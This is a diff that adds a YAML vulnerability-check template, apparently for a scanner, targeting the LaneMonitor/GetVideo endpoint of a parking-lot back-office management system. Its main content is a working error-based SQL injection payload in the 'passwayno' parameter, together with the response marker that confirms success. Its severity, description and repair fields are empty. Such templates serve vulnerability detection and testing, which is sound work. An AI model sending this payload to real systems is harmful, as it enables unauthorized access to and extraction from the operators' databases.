@@ -1,0 +1,23 @@
+id:
+
+info:
+  name: 停车场后台管理系统 LaneMonitor_GetVideo SQL注入
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /LaneMonitor/GetVideo?passwayno=1%27+AND+GTID_SUBSET%28CONCAT%280x71627a7871%2C%28SELECT+%28ELT%283079%3D3079%2C1%29%29%29%2C0x7176786b71%29%2C3079%29+AND+%27OVwj%27%3D%27OVwj
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+    Accept: '*/*'
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate, br
+    Connection: keep-alive
+response1:
+  headers:
+  body: qbzx
+  code: 200
+requests2:
+response2:
